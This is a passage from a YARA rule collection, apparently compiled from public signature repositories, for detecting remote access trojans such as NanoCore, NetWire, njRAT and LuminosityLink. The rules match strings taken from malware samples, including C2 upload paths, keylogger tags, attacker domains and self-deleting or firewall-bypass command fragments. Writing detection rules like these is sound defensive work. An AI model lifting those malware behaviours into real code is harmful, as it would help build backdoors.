original_name = \"konni\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $pdb0 = \"\\\\0_work\\\\planes\\\\\"\n        $pdb1 = \"\\\\0_work\\\\_programe\\\\\"\n        $introspect_str0 = \"System Type:\"\n        $introspect_str1 = \"OS is :\"\n        $introspect_str2 = \"Drive Information is as follow.\"\n        $introspect_str3 = \"This computer's username is\"\n        $introspect_str4 = \"This computer's name is\"\n        $introspect_str5 = \"This computer's IP Address is\"\n        $cnc_cmd0 = \"http://%s/weget/download.php?file=%s_dropcom\" ascii\n        $cnc_cmd1 = \"/upload.php\" nocase\n        $cnc_cmd2 = \"/uploadtm.php\" nocase\n        $cnc_cmd3 = \"/download.php\" nocase\n        $tmp_files0 = \"tedsul.ocx\" nocase\n        $tmp_files1 = \"helpsol.ocx\" nocase\n        $tmp_files2 = \"trepsl.ocx\" nocase\n        $tmp_files3 = \"psltred.ocx\" nocase\n        $tmp_files4 = \"solhelp.ocx\" nocase\n        $tmp_files5 = \"sulted.ocx\" nocase\n\n    condition:\n        (uint16(0) == 0x5A4D) and (any of ($pdb*)) and (all of ($introspect_str*)) and (4 of ($cnc_cmd* , $tmp_files*))\n}\n\nrule RAT_LostDoor\n{\n    meta:\n        description = \"LostDoor RAT\"\n        ref = \"http://malwareconfig.com/stats/LostDoor\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"LostDoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_LostDoor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a0 = {0D 0A 2A 45 44 49 54 5F 53 45 52 56 45 52 2A 0D 0A}\n        $a1 = \"*mlt* = %\"\n        $a2 = \"*ip* = %\"\n        $a3 = \"*victimo* = %\"\n        $a4 = \"*name* = %\"\n        $b5 = \"[START]\"\n        $b6 = \"[DATA]\"\n        $b7 = \"We Control Your Digital World\" wide ascii\n        $b8 = \"RC4Initialize\" wide ascii\n        $b9 = \"RC4Decrypt\" wide ascii\n\n    condition:\n        all of ($a*) or all of ($b*)\n}\n\nrule lost_door : Trojan\n{\n    meta:\n        description = \"LostDoor RAT\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"LostDoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Falcoz\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"lost_door\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $signature1 = {45 44 49 54 5F 53 45 52 56 45 52}\n\n    condition:\n        $signature1\n}\n\nrule LuminosityLink\n{\n    meta:\n        description = \"LuminosityLink RAT\"\n        ref = \"http://malwareconfig.com/stats/LuminosityLink\"\n        classifications = \"Backdoor\"\n        threat_names = \"LuminosityLink\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_LuminosityLink\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"SMARTLOGS\" wide\n        $b = \"RUNPE\" wide\n        $c = \"b.Resources\" wide\n        $d = \"CLIENTINFO*\" wide\n        $e = \"Invalid Webcam Driver Download URL, or Failed to Download File!\" wide\n        $f = \"Proactive Anti-Malware has been manually activated!\" wide\n        $g = \"REMOVEGUARD\" wide\n        $h = \"C0n1f8\" wide\n        $i = \"Luminosity\" wide\n        $j = \"LuminosityCryptoMiner\" wide\n        $k = \"MANAGER*CLIENTDETAILS*\" wide\n\n    condition:\n        all of them\n}\n\nprivate rule LURK0Header : Family LURK0\n{\n    meta:\n        description = \"LURK0 RAT\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Katie Kleemola\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"LURK0Header\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = { C6 [5] 4C C6 [5] 55 C6 [5] 52 C6 [5] 4B C6 [5] 30 }\n\n    condition:\n        any of them\n}\n\nprivate rule CCTV0Header : Family CCTV0\n{\n    meta:\n        description = \"LURK0 RAT\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Katie Kleemola\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"CCTV0Header\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = { C6 [5] 43 C6 [5] 43 C6 [5] 54 C6 [5] 56 C6 [5] 30 }\n        $ = { B0 43 88 [3] 88 [3] C6 [3] 54 C6 [3] 56 [0-12] (B0 30 | C6 [3] 30) }\n\n    condition:\n        any of them\n}\n\nprivate rule SharedStrings : Family\n{\n    meta:\n        description = \"LURK0 RAT\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Katie Kleemola\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"SharedStrings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $i1 = \"Butterfly.dll\"\n        $i2 = /\\\\BT[0-9.]+\\\\ButterFlyDLL\\\\/\n        $i3 = \"ETClientDLL\"\n        $d1 = \"\\\\DbxUpdateET\\\\\" wide\n        $d2 = \"\\\\DbxUpdateBT\\\\\" wide\n        $d3 = \"\\\\DbxUpdate\\\\\" wide\n        $mc1 = \"\\\\Micet\\\\\"\n        $n1 = \"IconCacheEt.dat\" wide\n        $n2 = \"IconConfigEt.dat\" wide\n        $m1 = \"\\x00\\x00ERXXXXXXX\\x00\\x00\" wide\n        $m2 = \"\\x00\\x00111\\x00\\x00\" wide\n        $m3 = \"\\x00\\x00ETUN\\x00\\x00\" wide\n        $m4 = \"\\x00\\x00ER\\x00\\x00\" wide\n\n    condition:\n        any of them\n}\n\nrule LURK0 : Family LURK0\n{\n    meta:\n        description = \"LURK0 RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"LURK0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Katie Kleemola\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"LURK0\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        LURK0Header and SharedStrings\n}\n\nrule CCTV0 : Family CCTV0\n{\n    meta:\n        description = \"CCTV0 RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"CCTV0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Katie Kleemola\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"CCTV0\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        CCTV0Header and SharedStrings\n}\n\nrule LuxNet\n{\n    meta:\n        description = \"LuxNet RAT\"\n        ref = \"http://malwareconfig.com/stats/LuxNet\"\n        classifications = \"Backdoor\"\n        threat_names = \"LuxNet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_LuxNet\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"GetHashCode\"\n        $b = \"Activator\"\n        $c = \"WebClient\"\n        $d = \"op_Equality\"\n        $e = \"dickcursor.cur\" wide\n        $f = \"{0}|{1}|{2}\" wide\n\n    condition:\n        all of them\n}\n\nprivate rule MacControlCode : MacControl Family\n{\n    meta:\n        description = \"MacControl code tricks\"\n        classifications = \"Trojan, Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"MacControlCode\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $L4_Accept = { C7 ?? 41 63 63 65 C7 ?? 04 70 74 3A 20 }\n        $L4_AcceptLang = { C7 ?? 41 63 63 65 C7 ?? 04 70 74 2D 4C }\n        $L4_Pragma = { C7 ?? 50 72 61 67 C7 ?? 04 6D 61 3A 20 }\n        $L4_Connection = { C7 ?? 43 6F 6E 6E C7 ?? 04 65 63 74 69 }\n        $GEThgif = { C7 ?? 47 45 54 20 C7 ?? 04 2F 68 2E 67 }\n\n    condition:\n        all of ($L4*) or $GEThgif\n}\n\nprivate rule MacControlStrings : MacControl Family\n{\n    meta:\n        description = \"MacControl Identifying Strings\"\n        classifications = \"Trojan, Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"MacControlStrings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = \"HTTPHeadGet\"\n        $ = \"/Library/launched\"\n        $ = \"My connect error with no ip!\"\n        $ = \"Send File is Failed\"\n        $ = \"****************************You Have got it!****************************\"\n\n    condition:\n        any of them\n}\n\nrule MacControl : Family\n{\n    meta:\n        description = \"MacControl RAT\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"MacControl\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"MacControl\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        MacControlCode or MacControlStrings\n}\n\nrule MiniRAT_Gen_1\n{\n    meta:\n        description = \"MiniRAT malware\"\n        ref = \"https://www.eff.org/deeplinks/2018/01/dark-caracal-good-news-and-bad-news\"\n        classifications = \"Backdoor\"\n        threat_names = \"MiniRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MiniRAT_Gen_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\Mini rat\\\\\" ascii\n        $x2 = \"\\\\Projects\\\\ali\\\\Clever Components v7\\\\\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 7000KB and 1 of them\n}\n\nprivate rule MirageStrings : Mirage Family\n{\n    meta:\n        description = \"Mirage Identifying Strings\"\n        classifications = \"Trojan, Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"MirageStrings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = \"Neo,welcome to the desert of real.\" wide ascii\n        $ = \"/result?hl=en&id=%s\"\n\n    condition:\n        any of them\n}\n\nrule Mirage : Family\n{\n    meta:\n        description = \"Mirage RAT\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Mirage\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"Mirage\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        MirageStrings\n}\n\nrule NanoCore\n{\n    meta:\n        description = \"NanoCore RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"NanoCore\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"NanoCore\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"nanocore\" nocase\n        $s2 = \"clientplugin\" nocase\n        $s3 = \"projectdata\" nocase\n        $s4 = \"logclientmessage\" nocase\n\n    condition:\n        all of them\n}\n\nrule Nanocore_RAT_Gen_1\n{\n    meta:\n        description = \"NanoCore RAT\"\n        ref = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Nanocore_RAT_Gen_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"C:\\\\Users\\\\Logintech\\\\Dropbox\\\\Projects\\\\New folder\\\\Latest\\\\Benchmark\\\\Benchmark\\\\obj\\\\Release\\\\Benchmark.pdb\" fullword ascii\n        $x2 = \"RunPE1\" fullword ascii\n        $x3 = \"082B8C7D3F9105DC66A7E3267C9750CF43E9D325\" fullword ascii\n        $x4 = \"$374e0775-e893-4e72-806c-a8d880a49ae7\" fullword ascii\n        $x5 = \"Monitorinjection\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and (1 of them)) or (3 of them)\n}\n\nrule Nanocore_RAT_Gen_2\n{\n    meta:\n        description = \"NanoCore RAT\"\n        ref = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n        classifications = \"Backdoor\"\n        threat_names = \"NanoCore\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Nanocore_RAT_Gen_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"NanoCore.ClientPluginHost\" fullword ascii\n        $x2 = \"IClientNetworkHost\" fullword ascii\n        $x3 = \"#=qjgz7ljmpp0J7FvL9dmi8ctJILdgtcbw8JYUc6GC8MeJ9B11Crfg2Djxcf0p8PZGe\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them) or (all of them)\n}\n\nrule Nanocore_RAT_Sample_1\n{\n    meta:\n        description = \"NanoCore RAT\"\n        ref = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Nanocore_RAT_Sample_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"TbSiaEdJTf9m1uTnpjS.n9n9M7dZ7FH9JsBARgK\" fullword wide\n        $x2 = \"1EF0D55861681D4D208EC3070B720C21D885CB35\" fullword ascii\n        $x3 = \"popthatkitty.Resources.resources\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 900KB and (1 of ($x*))) or (all of them)\n}\n\nrule Nanocore_RAT_Sample_2\n{\n    meta:\n        description = \"NanoCore RAT\"\n        ref = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Nanocore_RAT_Sample_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"U4tSOtmpM\" fullword ascii\n        $s2 = \")U71UDAU_QU_YU_aU_iU_qU_yU_\" fullword wide\n        $s3 = \"Cy4tOtTmpMtTHVFOrR\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 40KB and all of ($s*)\n}\n\nrule Nanocore_RAT_Feb18_1\n{\n    meta:\n        description = \"NanoCore RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"NanoCore\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Nanocore_RAT_Feb18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"NanoCore Client.exe\" fullword ascii\n        $x2 = \"NanoCore.ClientPluginHost\" fullword ascii\n        $s1 = \"PluginCommand\" fullword ascii\n        $s2 = \"FileCommand\" fullword ascii\n        $s3 = \"PipeExists\" fullword ascii\n        $s4 = \"PipeCreated\" fullword ascii\n        $s5 = \"IClientLoggingHost\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 600KB and (1 of ($x*) or 5 of them)\n}\n\nrule Nanocore_RAT_Feb18_2\n{\n    meta:\n        description = \"NanoCore RAT\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Nanocore_RAT_Feb18_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ResManagerRunnable\" fullword ascii\n        $s2 = \"TransformRunnable\" fullword ascii\n        $s3 = \"MethodInfoRunnable\" fullword ascii\n        $s4 = \"ResRunnable\" fullword ascii\n        $s5 = \"RunRunnable\" fullword ascii\n        $s6 = \"AsmRunnable\" fullword ascii\n        $s7 = \"ReadRunnable\" fullword ascii\n        $s8 = \"ExitRunnable\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule NanoCore_\n{\n    meta:\n        description = \"NanoCore RAT\"\n        ref = \"http://malwareconfig.com/stats/NanoCore\"\n        classifications = \"Backdoor\"\n        threat_names = \"NanoCore\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_NanoCore\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"NanoCore\"\n        $b = \"ClientPlugin\"\n        $c = \"ProjectData\"\n        $d = \"DESCrypto\"\n        $e = \"KeepAlive\"\n        $f = \"IPNETROW\"\n        $g = \"LogClientMessage\"\n        $h = \"|ClientHost\"\n        $i = \"get_Connected\"\n        $j = \"#=q\"\n        $key = {43 6f 24 cb 95 30 38 39}\n\n    condition:\n        6 of them\n}\n\nrule NetWire_Malicious_BAT_Strings\n{\n    meta:\n        description = \"Netwire RAT\"\n        ref = \"https://pastebin.com/8qaiyPxs\"\n        classifications = \"Backdoor\"\n        threat_names = \"Netwire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Malicious_BAT_Strings\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"call :deleteSelf&exit /b\"\n\n    condition:\n        filesize < 600KB and 1 of them\n}\n\nrule NetWire\n{\n    meta:\n        description = \"NetWire RAT\"\n        ref = \"http://malwareconfig.com/stats/NetWire\"\n        classifications = \"Backdoor\"\n        threat_names = \"Netwire\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net> & David Cannings\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_NetWire\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $exe1 = \"%.2d-%.2d-%.4d\"\n        $exe2 = \"%s%.2d-%.2d-%.4d\"\n        $exe3 = \"[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\"\n        $exe4 = \"wcnwClass\"\n        $exe5 = \"[Ctrl+%c]\"\n        $exe6 = \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\ProductOptions\"\n        $exe7 = \"%s\\\\.purple\\\\accounts.xml\"\n\n    condition:\n        all of them\n}\n\nrule NetWiredRC_B : RAT\n{\n    meta:\n        description = \"NetWiredRC RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"NetWiredRC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jean-Philippe Teissier / @Jipe_\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"NetWiredRC_B\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $mutex = \"LmddnIkX\"\n        $str1 = \"%s.Identifier\"\n        $str2 = \"%d:%I64u:%s%s;\"\n        $str3 = \"%s%.2d-%.2d-%.4d\"\n        $str4 = \"[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\"\n        $str5 = \"%.2d/%.2d/%d %.2d:%.2d:%.2d\"\n        $klg1 = \"[Backspace]\"\n        $klg2 = \"[Enter]\"\n        $klg3 = \"[Tab]\"\n        $klg4 = \"[Arrow Left]\"\n        $klg5 = \"[Arrow Up]\"\n        $klg6 = \"[Arrow Right]\"\n        $klg7 = \"[Arrow Down]\"\n        $klg8 = \"[Home]\"\n        $klg9 = \"[Page Up]\"\n        $klg10 = \"[Page Down]\"\n        $klg11 = \"[End]\"\n        $klg12 = \"[Break]\"\n        $klg13 = \"[Delete]\"\n        $klg14 = \"[Insert]\"\n        $klg15 = \"[Print Screen]\"\n        $klg16 = \"[Scroll Lock]\"\n        $klg17 = \"[Caps Lock]\"\n        $klg18 = \"[Alt]\"\n        $klg19 = \"[Esc]\"\n        $klg20 = \"[Ctrl+%c]\"\n\n    condition:\n        $mutex or (1 of ($str*) and 1 of ($klg*))\n}\n\nrule NewCore_1\n{\n    meta:\n        description = \"NewCore RAT\"\n        ref = \"https://blog.fortinet.com/2017/09/05/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations\"\n        classifications = \"Backdoor\"\n        threat_names = \"NewCore\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Rehashed_RAT_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"C:\\\\Users\\\\hoogle168\\\\Desktop\\\\\"\n        $x2 = \"\\\\NewCoreCtrl08\\\\Release\\\\NewCoreCtrl08.pdb\" ascii\n        $s1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729\" ascii\n        $s2 = \"NewCoreCtrl08.dll\" fullword ascii\n        $s3 = \"GET /%s%s%s%s HTTP/1.1\" fullword ascii\n        $s4 = \"http://%s:%d/%s%s%s%s\" fullword ascii\n        $s5 = \"MyTmpFile.Dat\" fullword wide\n        $s6 = \"root\\\\%s\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 800KB and (pe.imphash() == \"893212784d01f11aed9ebb42ad2561fc\" or pe.exports(\"ProcessTrans\") or (1 of ($x*) or 4 of them))) or (all of them)\n}\n\nrule NewCore_2\n{\n    meta:\n        description = \"NewCore RAT\"\n        ref = \"https://blog.fortinet.com/2017/09/05/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations\"\n        classifications = \"Backdoor\"\n        threat_names = \"NewCore\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Rehashed_RAT_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"dalat.dulichovietnam.net\" fullword ascii\n        $x2 = \"web.Thoitietvietnam.org\" fullword ascii\n        $a1 = \"User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64)\" fullword ascii\n        $a2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3\" ascii\n        $s1 = \"GET /%s%s%s%s HTTP/1.1\" fullword ascii\n        $s2 = \"http://%s:%d/%s%s%s%s\" fullword ascii\n        $s3 = \"{521338B8-3378-58F7-AFB9-E7D35E683BF8}\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"9c4c648f4a758cbbfe28c8850d82f931\" or (1 of ($x*) or 3 of them))) or (4 of them)\n}\n\nrule NewCore_3\n{\n    meta:\n        description = \"NewCore RAT\"\n        ref = \"https://blog.fortinet.com/2017/09/05/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations\"\n        classifications = \"Backdoor\"\n        threat_names = \"NewCore\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Rehashed_RAT_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\BisonNewHNStubDll\\\\Release\\\\Goopdate.pdb\" fullword ascii\n        $s2 = \"psisrndrx.ebd\" fullword wide\n        $s3 = \"pbad exception\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and (1 of ($x*) or 2 of them)\n}\n\nrule njRat_1\n{\n    meta:\n        description = \"njRAT malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"njRat\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"njrat\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $a1 = \"netsh firewall add allowedprogram \" wide\n        $a2 = \"SEE_MASK_NOZONECHECKS\" wide\n        $b1 = \"[TAP]\" wide\n        $b2 = \" & exit\" wide\n        $c1 = \"md.exe /k ping 0 & del \" wide\n        $c2 = \"cmd.exe /c ping 127.0.0.1 & del\" wide\n        $c3 = \"cmd.exe /c ping\" wide\n\n    condition:\n        1 of ($a*) and 1 of ($b*) and 1 of ($c*)\n}\n\nrule njRat_3\n{\n    meta:\n        description = \"njRAT malware\"\n        ref = \"http://malwareconfig.com/stats/njRat\"\n        classifications = \"Backdoor\"\n        threat_names = \"njRat\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_njRat\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = {7C 00 27 00 7C 00 27 00 7C}\n        $s2 = \"netsh firewall add 